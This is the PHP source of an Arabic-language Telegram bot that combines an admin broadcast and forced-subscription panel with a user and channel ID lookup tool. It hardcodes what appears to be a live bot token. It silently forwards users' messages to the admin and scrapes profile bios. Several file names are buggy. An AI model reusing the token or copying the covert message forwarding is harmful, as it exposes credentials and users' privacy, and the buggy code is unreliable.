<?php
flush();
ob_start();
set_time_limit(0);
error_reporting(0);
ob_implicit_flush(1);
#====#
$token = "6712409165:AAGVjqfijfwmqbhHHDJq2YwtqGeyEuRI9jA";# توكنك تمام
$tokens = "6712409165:AAGVjqfijfwmqbhHHDJq2YwtqGeyEuRI9jA"; #توكنك
#====#
define('API_KEY',$token);
echo "setWebhook ~> <a href=\"https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']."\">https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']."</a>";
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}}

#Short
$update = json_decode(file_get_contents('php://input'));
$message= $update->message;
$text = $message->text;
$chat_id= $message->chat->id;
$name = $message->from->first_name;
$user = $message->from->username;
$message_id = $update->message->message_id;
$from_id = $update->message->from->id;
$a = strtolower($text);
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
mkdir("data");
mkdir("sudo");
$msg = file_get_contents("msg.php");
$forward = file_get_contents("forward.php");
$midea = file_get_contents("midea.php");
$inlin = file_get_contents("inlin.php");
$photoi = file_get_contents("photoi.php");
$upq = file_get_contents("up.php");
$skor = file_get_contents("skor.php");
$channel = file_get_contents("link.php");
$link = file_get_contents("link2.php");
$ch = "source_ze";
$admin = "6581896306";
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$ch&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
 'text'=>"
🤍| عذرا عزيزي
🕊| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- ($link)

🌼| اشترك ثم ارسل /start",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);return false;}

$uuser = file_get_contents("uuser.php");
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$uuser&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
 'text'=>"
🤍| عذرا عزيزي
🕊| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- $uuser

🌼| اشترك ثم ارسل /start",
]);return false;}

$users = explode("\n",file_get_contents("arslan.json"));

if($message){
if(!in_array($from_id,$users)){
file_put_contents("arslan.json",$from_id."\n",FILE_APPEND);}}

$tc = $message->chat->type;
$arslan09 = json_decode(file_get_contents("arslan09.json"),true);
$suodo = $arslan09['sudoarr'];
$al = $arslan09['addmessage'];
$ab = $arslan09['messagee'];
$xll = $al + $ab;
if($message and $from_id !== $admin){
$arslan09['messagee'] = $arslan09['messagee']+1;
file_put_contents("arslan09.json",json_encode($arslan09,32|128|265));
}
if($message and $from_id == $admin){
$arslan09['addmessage'] = $arslan09['addmessage']+1;
file_put_contents("arslan09.json",json_encode($arslan09,32|128|265));
}

$all = count($users)-1;

$adminss = explode("\n",file_get_contents("ad.json"));

$k088 = file_get_contents("data/k088.txt");
$q1 = file_get_contents("data/q1.txt");
$q2 = file_get_contents("q2.txt");
$q3 = file_get_contents("data/q3.txt");
$q4 = file_get_contents("q4.txt");
$q5 = file_get_contents("data/q5.txt");
$aralikan = file_get_contents("q6.txt");


if($message){
if(!in_array($admin,$adminss)){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
تم تحديث القائمه /start
",
]);
file_put_contents("ad.json",$admin."\n",FILE_APPEND);
}}

$d = date('D');
$day = explode("\n",file_get_contents($d.".txt"));
$todayuser = count($day);
if($d == "Sat"){
unlink("Fri.txt");
}
if($d == "Sun"){
unlink("Sat.txt");
}
if($d == "Mon"){
unlink("Sun.txt");
}
if($d == "Tue"){
unlink("Mon.txt");
}
if($d == "Wed"){
unlink("The.txt");
}
if($d == "Thu"){
unlink("Wedtxt");
}
if($d == "Fri"){
unlink("Thu.txt");
}
if($message and !in_array($from_id, $day)){ 
file_put_contents($d.".txt",$from_id. "\n",FILE_APPEND);
}

$from_id = $message->from->id;
$name = $message->from->first_name;
$id = $message->from->id;
$user = $message->from->username;
if($user){
$user = "@$user";
}
elseif(!$uaer){
$user = "بلا معرف";
}
if($text =="/start" and !in_array($from_id,$users)){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
٭ تم دخول شخص جديد الى البوت الخاص بك 🤍
  
• معلومات العضو الجديد .
                 •--•
• الاسم : $name
• المعرف : $user
• الايدي : $id
                  •--•
• عدد الاعضاء الكلي : $all
",
]);
}

$bot = file_get_contents("bot.txt");

if($text =="/almortagel" and in_array($from_id,$adminss)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✰ ⁞ اهلا بك مطوري اليك لوحة التحكم الخاصه بك 🤍
  ✰ ⁞ لا تنسئ الصلاة علئ النبي 🤍


",
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- قفل البوت .","callback_data"=>"abcd"],["text"=>"- فتح البوت .","callback_data"=>"abcde"]],
[["text"=>"- اعضاء البوت .","callback_data"=>"userd"]],
[["text"=>"- تفعيل التنبيه .","callback_data"=>"ont"],["text"=>"- تعطيل التنبيه .","callback_data"=>"oft"]],
[["text"=>"- قسم الاذاعةه .","callback_data"=>"for"]],
[['text' => "- قائمةه الاشتراك .", 'callback_data' => "channel"],['text' => "- الاشتراك ($skor) .", "callback_data" => "off"]],
[['text' => "- نسخة احتياطيةه .", 'callback_data' => "file"],['text' => "- رفع النسخةه .", 'callback_data' => "up"]],
[['text' => "- الاحصائيات .", 'callback_data' => "pannel"],['text' => "- قسم الادمن .", 'callback_data' => "lIllarslan"]],
[['text' => "- التعديلات .", 'callback_data' => "xxxtentacionllllo"]],
[['text' => "- كليشةه /start .", 'callback_data' => "editstart"]],
]])
]);   
}

//رفع ادمن//
if($data =="lIllarslan"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"اهلا بك مطوري في قسم رفع ادمن اخر", 
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- رفع ادمن.","callback_data"=>"adl"]],
[["text"=>"- اخر الادمن.","callback_data"=>"addmin"]],
[["text"=>"- حذف الادمنيه.","callback_data"=>"delateaddmin"]],
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);   
}

if($data == "adl"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
قم بارسال ايدي العضو
 ",
]); 
file_put_contents("data/k088.txt","k088");
}
if($text !="/start" and $k088 == "k088" and !in_array($text,$adminss)){
file_put_contents("data/k088.txt","none");
file_put_contents("ad.json",$text."\n",FILE_APPEND);} 

if($text != "/start" and $k088 == "k088" and !in_array($text,$adminss)){
file_put_contents("data/k088.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم رفع العضو", 
]);
bot('sendmessage',[
'chat_id'=>$text,
'text'=>"تم رفعك ادمن في البوت", 
]);
}
if($text !="/start" and $k088 == "k088" and in_array($text,$adminss)){
file_put_contents("data/k088.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"العضو ادمن بالفعل", 
]);
}
if($data =="addmin"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"اخر خمس ادمنيه :
 1 - ".$adminss[count($adminss)-2]."
 2 - ️".$adminss[count($adminss)-3]."
 3 - ️".$adminss[count($adminss)-4]."
 4 - ️".$adminss[count($adminss)-5]."
 5 - ️".$adminss[count($adminss)-6]."
",
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- الصفحه الرئيسيه.","callback_data"=>"bak"]],
]])
]);   
}
if($data =="delateaddmin" and $chat_id2 =="$admin"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
هل انت متاكد من الحذف
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'لا' ,'callback_data'=>"bak"]],
[['text'=>'نعم' ,'callback_data'=>"yesaarsslan"]],
]])
]);
}
if($data =="yesaarsslan"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
تم حذف الادمنيه
",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
unlink("ad.json");
}

$almortagel = file_get_contents("almortagel.txt");
if($data =="abcde"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"- اهلا بك عزيزي
- تم فتح البوت 
- /start",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
file_put_contents("almortagel.txt","on");
} 
if($data =="abcd"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"- اهلا بك عزيزي
- تم قفل البوت
- /start ",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]); 
file_put_contents("almortagel.txt","off");
} 
if($message and $almortagel =="off" and $chat_id != $admin ){
 bot("sendmessage",[
 "chat_id"=>$chat_id,
 "text"=>"
🕵 | مرحبا بك عزيزي ،
⚠ | #ناسف عن توقف البوت ،
⚙ | فقط تحت الصيانة والتحديث ،
🔘 | سيتم اعادته للخدمة الساعات القادمة ،
",'reply_to_message_id'=>$message->message_id,
  'reply_markup'=>json_encode([
      'inline_keyboard'=>[
[['text' => "✧ - المطور 🌐", 'url' =>"https://t.me/zzsszzz"]],
[['text' => "✧ - قناة تحديثات البوت", 'url' =>"https://t.me/BDthon"]],
]])]);return false;
}

if($data =="userd"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 اهلا بك عزيزي الادمن
 عدد الاعضاء : ( $all )",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
}

if($data == 'ont'){
file_put_contents("ont.php", "on");
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"
 مرحبا عزيزي
 تم تفعيل الاشعارات في البوت
➖➖➖➖➖➖➖➖
",
'show_alert'=>true
]);
}
if($data == 'oft'){
file_put_contents("ont.php", "off");
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>"
 مرحبا عزيزي
⚠ تم تعطيل الاشعارات في البوت
➖➖➖➖➖➖➖➖
",
'show_alert'=>true
]);
}
$ont = file_get_contents("ont.php");
if($ont == "on"){
if($from_id != $admin){
if($message){
bot('ForwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}}}

if($data == "for"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم باختيار ما يناسبك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"اذاعه صورة ",'callback_data'=>"photoi"]],
[['text' => "اذاعه رسالة ", 'callback_data' => "msg"],['text' => "اذاعه توجيه ", 'callback_data' => "forward"]],
[['text' => "اذاعه ميديا ", 'callback_data' => "midea"],['text' => "اذاعه انلاين ", 'callback_data' => "inline"]],
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
}
if($data == "msg"){
file_put_contents("msg.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال رسالتك لتحويلها لجميع المشتركين",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
if($msg == "on"){
if($message){
for($i=0;$i<count($users); $i++){
bot('sendmessage',[
'chat_id'=>$users[$i],
'text'=>"$text",
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم عمل اذاعه بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("msg.php");
}}
if($data == "forward"){
file_put_contents("forward.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال رسالتك لتحويلها لجميع المشتركين على شكل توجيه",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء ",'callback_data'=>"bak"]],
]])
]);
}
if($forward == "on"){
if($message){
for($i=0;$i<count($users); $i++){
bot('ForwardMessage',[
'chat_id'=>$users[$i],
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم عمل اذاعه توجيه بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"bak"]],
]])
]);
unlink("forward.php");
}}
if($data == "midea"){
file_put_contents("midea.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 يمكنك استخدام جميع انوع الميديا ماعدى الصوره
 (ملصق - فيديو - بصمه - ملف صوتي - ملف - متحركه - جهة اتصال )",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
$up = json_decode(file_get_contents('php://input'),true);
if(!isset($message->text)){
$types = ['voice','audio','video','photo','contact','document','sticker'];
foreach($up['message'] as $key => $val){
if(in_array($key,$types) and $midea == "on"){
for($i=0;$i<count($users); $i++){
bot('send'.$key,[
'chat_id'=>$users[$i],
'caption'=>$message->caption,
$key=>$val['file_id']]);
unlink("midea.php");
}
}
}}
if($data == "photoi"){
file_put_contents("photoi.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال الصورة لنشرها لجميع المشتركين",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء ",'callback_data'=>"bak"]],
]])
]);
}
if($photoi == "on"){
if($message->photo){
for($i=0;$i<count($users); $i++){
bot('sendphoto',[
'chat_id'=>$users[$i],
'photo'=>$message->photo[0]->file_id,
'caption'=>$message->caption,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم نشر الصورة بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("photoi.php");
}}
if($data == "inline"){
file_put_contents("inlin.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بتوجيه نص الانلاين لاقوم بنشره للمشتركين",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
if($inlin == "on"){
if($message->forward_from or $message->forward_from_chat){
for($i=0;$i<count($users); $i++){
bot('forwardmessage',[
'chat_id'=>$users[$i],
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id,
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم نشر الانلاين بنجاح
 الى ( $all ) مشترك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
unlink("inlin.php");
}}

if($data == "channel"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بتحديد الامر لأتمكن من تنفيذه",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"قناة خاصة ",'callback_data'=>"link"]],
[['text'=>"قناة عامة ",'callback_data'=>"user"]],
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
}
if($data == "link"){
file_put_contents("link.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم برفع البوت ادمن في القناة
 ثم ارسل توجيه من القناة الى هنا",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
}
$channel_id = $message->forward_from_chat->id;
if($channel == "on"){
if($message->forward_from_chat){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 قم الان بأرسال رابط القناة هنا",
]);
file_put_contents("link.php", $channel_id);
file_put_contents("link2.php", "on");
}}
if($link == "on"){
if(preg_match('/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me|(.*)telesco.me|telesco.me(.*)/i',$text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم تفعيل الاشتراك بنجاح",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"اتمام العملية",'callback_data'=>"bak"]],
]])
]);
file_put_contents("link2.php", $text);
file_put_contents("skor.php", "مفعل ✅");
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 عذرا عزيزي
 قم بأرسال الرابط بصورة صحيحه",
]);
}
}

if($data == "user"){
bot('editmessagetext',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم برفع البوت ادمن في القناة
 ثم ارسل يوزر القناة لتفعيل الاشتراك",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
file_put_contents("uuser.php", "on");
}
if($uuser == "on"){
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)#(.*)|#(.*)|(.*)#/',$text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 حسنا عزيزي
 تم تفعيل الاشتراك بنجاح",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"اتمام العملية ⏱",'callback_data'=>"bak"]],
]])
]);
file_put_contents("skor.php", "مفعل ✅");
file_put_contents("uuser.php", $text);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 عذرا عزيزي
 قم بأرسال يوزر بصورة صحيحه",
]);
}
}

if($skor == "معطل ⚠️"){
if($data == 'off'){
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'message_id'=>$message_id,
'text'=>'
 مرحبا عزيزي
 حالة الاشتراك الاجباري معطل
 قم بختيار - قائمةه الاشتراك .وقم بتفعيله
',
 'show_alert'=>true
 ]); 
}}
if($skor == "مفعل ✅"){
if($data == 'off'){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'
 حسنا عزيزي
 حالت الاشتراك الخاص بك مفعل
 هل انت متأكد من رغبتك في تعطيل الاشتراك
',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[
['text'=>'نعم ', 'callback_data'=>'yesde2'],
['text'=>'لا ','callback_data'=>'bak'],
]
]])
]);
}}

if($data == "yesde2"){
unlink("uuser.php");
unlink("link.php");
file_put_contents("skor.php", "معطل ⚠️");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 تم تعطيل الاشتراك في جميع القنواة
 يمكنك تفعيل الاشتراك لقناتك في مابعد",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع",'callback_data'=>"bak"]],
]])
]);
}

$bloktime = date('h:i:s A');
if($data == "file"){
$path = realpath("arslan.json");
bot('senddocument',[
'chat_id'=>$chat_id2,
'document'=>new CURLFile($path),
'caption'=>"
 نسخة لمشتركينك
 وقت الارسال : ( $bloktime )
 عدد المشتركين : ( $all )
",
]);
}

if($data == "up"){
bot('editmessagetext',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
 حسنا عزيزي
 قم بأرسال ملف الاعضاء الان
 ارسل الملف بأسم : arslan.json",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ",'callback_data'=>"bak"]],
]])
]);
file_put_contents("up.php", "on");
}
$rep = $message->document->file_name;
if($upq == "on"){
if($message->document and $message->document->file_name == "arslan.json" ){
$file = "https://api.telegram.org/file/bot".API_KEY."/".bot('getfile',['file_id'=>$message->reply_to_message->document->file_id])->result->file_path;
file_put_contents($message->reply_to_message->document->file_name,file_get_contents($file));
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"* تم رفع الملف  : $rep*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
unlink("up.php");
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"* لايمكن رفع الملف  : $rep*",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء",'callback_data'=>"bak"]],
]])
]);
}
}

if($data =="pannel"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"*اهلا بك في قسم - الاحصائيات . 📊
--------------------------
 عدد اعضاء بوتك : $all
 المتفاعلين اليوم  : $todayuser
 عدد الرسائل المرسله : ".$arslan09['addmessage']."
 عدد الرسائل المستلمه : ".$arslan09['messagee']."
 مجموع الرسائل : $xll
--------------------------
 اخر خمس مشتركين :
▫️ 1- ".$users[count($users)-2]."
▫️ 2- ️".$users[count($users)-3]."
▫️ 3- ️".$users[count($users)-4]."
▫️ 4- ️".$users[count($users)-5]."
▫️ 5- ️".$users[count($users)-6]."
--------------------------*",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'الصفحه الرئيسيه' ,'callback_data'=>"bak"]],
]])
]);
}

if($data == "editstart"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
قم بارسال رسالة الاستارت الان
 ",
]); 
file_put_contents("data/q1.txt","q1");
}
if($text != "/start" and $q1 == "q1"){
file_put_contents("data/q1.txt","none");
file_put_contents("q2.txt","$text");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم التعين بنجاح", 
]);
}

if ($data == 'bak'){
$msg = unlink("msg.php");
unlink("forward.php");
unlink("midea.php");
unlink("inlin.php");
unlink("photoi.php");
unlink("up.php");
unlink("up.php");
bot('editmessagetext',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"✰ ⁞ اهلا بك مطوري اليك لوحة التحكم الخاصه بك 🤍
  ✰ ⁞ لا تنسئ الصلاة علئ النبي 🤍

 
",
'parse_mode'=>"Markdown",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"- قفل البوت .","callback_data"=>"abcd"],["text"=>"- فتح البوت .","callback_data"=>"abcde"]],
[["text"=>"- اعضاء البوت .","callback_data"=>"userd"]],
[["text"=>"- تفعيل التنبيه .","callback_data"=>"ont"],["text"=>"- تعطيل التنبيه .","callback_data"=>"oft"]],
[["text"=>"- قسم الاذاعةه .","callback_data"=>"for"]],
[['text' => "- قائمةه الاشتراك .", 'callback_data' => "channel"],['text' => "- الاشتراك ($skor) .", "callback_data" => "off"]],
[['text' => "- نسخة احتياطيةه .", 'callback_data' => "file"],['text' => "- رفع النسخةه .", 'callback_data' => "up"]],
[['text' => "- الاحصائيات .", 'callback_data' => "pannel"],['text' => "- قسم الادمن .", 'callback_data' => "lIllarslan"]],
[['text' => "- التعديلات .", 'callback_data' => "xxxtentacionllllo"]],
[['text' => "- كليشةه /start .", 'callback_data' => "editstart"]],
]])
]);   
}
//////////////////////من هنا ۞𝙷ٍْ𝙼ٍْ𝚂ْ 𓃠۞بداية العمل///////////////////


$update = json_decode(file_get_contents('php://input'));
if(isset($update->message)){
    $message = $update->message; 
    $chat_id = $message->chat->id;
    $text = $message->text;
    $idchannel = $update->message->forward_from_chat->id;

}
$data = json_decode(file_get_contents("Data/$chat_id/data.json"),true);
$step = $data['step'];

mkdir("Data/$chat_id");
$language = json_encode(['keyboard'=>[
[['text'=>"العربية 🇸🇦"],['text'=>"English 🇱🇷"],['text'=>"🇮🇷 فارسى"]],
[['text'=>"لاستخراج Api id و api hash"]],
],'resize_keyboard'=>true]);


if($update->message->forward_from_chat){
bot('sendmessage', [
'chat_id'=>$chat_id, 
'parse_mode'=>html,
'text'=>"id channel <code>$idchannel</code>",
]);
}
if($text == "لنبتك" ){
bot('sendmessage', [
'chat_id'=>$chat_id, 
'parse_mode'=>html,
'text'=>"<code>$chat_id</code>",
]);
}
if($update->message->new_chat_members){
bot('sendMessage',[
'chat_id'=>$chat_id,
'parse_mode'=>html,
'text'=>"<code>$chat_id</code>",
]);
bot('leaveChat',[
'chat_id'=>$chat_id,
]);
}

if($step !== "ar" and $step !== "en" and $step !== "fa"){
if( $text == "/start"){
$data['step'] = "create";
bot('sendmessage', [
'chat_id'=>$chat_id, 
'parse_mode'=>html,
'text'=>"👋🏻مرحبا بك في بوت كشف معلومات\n\n👋🏻 استقبال به افشای اطلاعات ربات\n\n👋🏻 Welcome to bot information disclosure",
'reply_markup'=>$language
]);
}
}
if($step == "ar" and $text == "/start" or $text == "العربية 🇸🇦" ){
$data['step'] = "ar";
file_put_contents("Data/$chat_id/data.json",json_encode($data));
bot('sendmessage', [
'chat_id'=>$chat_id, 
'parse_mode'=>html,
'text'=>"1⃣ أرسل /id لإظهار ايديك ومعلوماتك 


2⃣ قم بعمل توجيه منشور في قناتك لأظهار إيدي القناة

3⃣ أضفني إلى مجموعتك لإظهار
 إيدي المجموعة

4⃣ لمعرفة معلومات شخص اخر قم بتوجيه رساله منه الى البوت وسيتم عرض معلوماته

5⃣ لمعرفة معلومات ايدي شخص معين 

اكتب ايدي + رقم الايدي

مثال : ايدي 6799580948

Channel : @X_RiR_X",
'reply_markup'=>$language
]);
}
if($step == "en" and $text == "/start" or $text == "English 🇱🇷" ){
$data['step'] = "en";
file_put_contents("Data/$chat_id/data.json",json_encode($data));
bot('sendmessage', [
'chat_id'=>$chat_id, 
'parse_mode'=>html,
'text'=>"1⃣ send /id show your id\n\n2⃣ Make a directive prism in your channel Show id \n\n3⃣ Add me to your Group Show id Group",
'reply_markup'=>$language
]);
}
if($step == "fa" and $text == "/start" or $text == "🇮🇷 فارسى" ){
$data['step'] = "fa";
file_put_contents("Data/$chat_id/data.json",json_encode($data));
bot('sendmessage', [
'chat_id'=>$chat_id, 
'parse_mode'=>html,
'text'=>"1⃣ ارسال /id اطلاعات ايديک\n\n2⃣ یک جزوه در کانال خود را برای نشان دادن ادی کانال\n\n3⃣ من را به مجموعه خود اضافه کنید تا دست گروه را نشان دهید.",
'reply_markup'=>$language
]);
}

###معلومات###
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$text = $message->text;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$username = $update->message->from->username;
$ca = $update->callback_query;
$data = $ca->data;
$messageid = $ca->message->message_id;
$forwardid = $ca->message->forward_from_chat;
$chat_id2 = $ca->message->chat->id;
$fromid = $ca->message->from->id;
$name = $update ->message->from->first_name;
$forward_name = $message->forward_from->first_name;
$forward_from = $message->forward_from;
$forward_id = $forward_from->id;
$forward_text = $forward_from->message;
$forward_username = $forward_from->username;

$admin = "6799580948";
$tgpage = file_get_contents('https://t.me/'.$username);preg_match('/<div class="tgme_page_description">(.*?)<\/div>/i',$tgpage,$bio);$biography = isset($bio[1]) ? $bio[1]:'Yσυ ∂σ ησт нανє α вισgяαρну‼️';
$tgpage = file_get_contents('https://t.me/'.$forward_username);preg_match('/<div class="tgme_page_description">(.*?)<\/div>/i',$tgpage,$bio);$biograph = isset($bio[1]) ? $bio[1]:'Yσυ ∂σ ησт нανє α вισgяαρну‼️';
#####----------------#####

if($text=="/id"){
$us = file_get_contents("users.txt");$eq = explode("\n",$us);if(!in_array($from_id,$eq)){$myfile2 = fopen("users.txt", "a") or die("Unable to open file!");fwrite($myfile2, "$from_id\n");fclose($myfile2);}
$res = bot("getUserProfilePhotos",["user_id"=>$chat_id,"limit"=>1,"offset"=>0,])->result->photos[0][2]->file_id;
$get = bot('getchat',['chat_id'=>$from_id])->result;
$username = $get->username ;
$biography =  $get->bio; 
